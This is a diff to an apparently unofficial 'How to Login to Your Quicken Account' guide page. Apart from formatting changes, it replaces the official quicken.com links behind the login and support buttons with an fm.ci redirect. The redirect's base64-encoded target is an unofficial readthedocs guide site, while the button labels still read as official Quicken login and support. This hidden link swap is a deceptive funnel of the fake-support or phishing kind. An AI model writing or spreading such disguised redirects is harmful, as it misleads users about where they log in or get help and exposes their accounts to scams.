@@ -4,7 +4,7 @@ How to Login to Your Quicken Account?
 .. raw:: html
 
     <div style="text-align:center; margin-top:30px;">
-        <a href="https://www.quicken.com/sign-in" style="background-color:#007bff; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
+        <a href="https://fm.ci/?aHR0cHM6Ly9xdWlja2VuZ3VpZGVsaW5lLnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdA==" style="background-color:#008bff; color:#ffffff; padding:12px 28px; font-size:16px; font-weight:bold; text-decoration:none; border-radius:6px; box-shadow:0 4px 6px rgba(0,0,0,0.1); display:inline-block;">
             Login to Quicken Account
         </a>
     </div>
@@ -27,22 +27,28 @@ Step-by-Step Guide: How to Login to Your Quicken Account
 ---------------------------------------------------------
 
 1. **Open the Official Quicken Login Page**  
-   Use a trusted browser (Chrome, Firefox, Edge, Safari) and go to:  
+
+   Use a trusted browser (Chrome, Firefox, Edge, Safari) and go to:
+
    https://www.quicken.com/sign-in
 
 2. **Enter Your Quicken ID**  
+
    This is your registered email address used when you created your account.
 
 3. **Enter Your Password**  
+
    Be careful with uppercase/lowercase. Passwords are case-sensitive.
 
 4. **Click “Sign In”**  
+
    Once both fields are entered, click the button to continue.
 
 5. **Complete Two-Factor Authentication (if enabled)**  
    Enter the verification code sent to your registered email or phone.
 
 6. **You’re In!**  
+
    Access your dashboard, view transactions, and manage your finances with ease.
 
 What to Do If You Can’t Log In
@@ -98,15 +104,19 @@ FAQs
 ----
 
 **Q: Can I use the same Quicken ID on multiple devices?**  
+
 Yes, and your data stays synced across all of them.
 
 **Q: What if I don’t receive the verification code?**  
+
 Check your spam folder and confirm your registered contact info is correct.
 
 **Q: How do I change my Quicken password?**  
+
 Log in and go to **Account Settings > Change Password**.
 
 **Q: Is it safe to save my login in the browser?**  
+
 Use a password manager instead — it’s more secure than browser-stored passwords.
 
 Conclusion
@@ -119,13 +129,13 @@ Logging into your Quicken account is the first step to effective financial manag
 .. raw:: html
 
     <div style="text-align:center; margin-top:30px;">
-        <a href="https://www.quicken.com/sign-in" style="background-color:#007bff; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+        <a href="https://fm.ci/?aHR0cHM6Ly9xdWlja2VuZ3VpZGVsaW5lLnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdA==" style="background-color:#007bff; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
              Login to Quicken
         </a>
         <a href="https://www.quicken.com/my-account/forgot-password" style="background-color:#6c757d; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
              Forgot Password
         </a>
-        <a href="https://www.quicken.com/support" style="background-color:#28a745; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
+        <a href="https://fm.ci/?aHR0cHM6Ly9xdWlja2VuZ3VpZGVsaW5lLnJlYWR0aGVkb2NzLmlvL2VuL2xhdGVzdA==" style="background-color:#28a745; color:#ffffff; padding:10px 24px; font-size:15px; font-weight:bold; text-decoration:none; border-radius:5px; margin:5px; display:inline-block;">
              Quicken Support
         </a>
     </div>
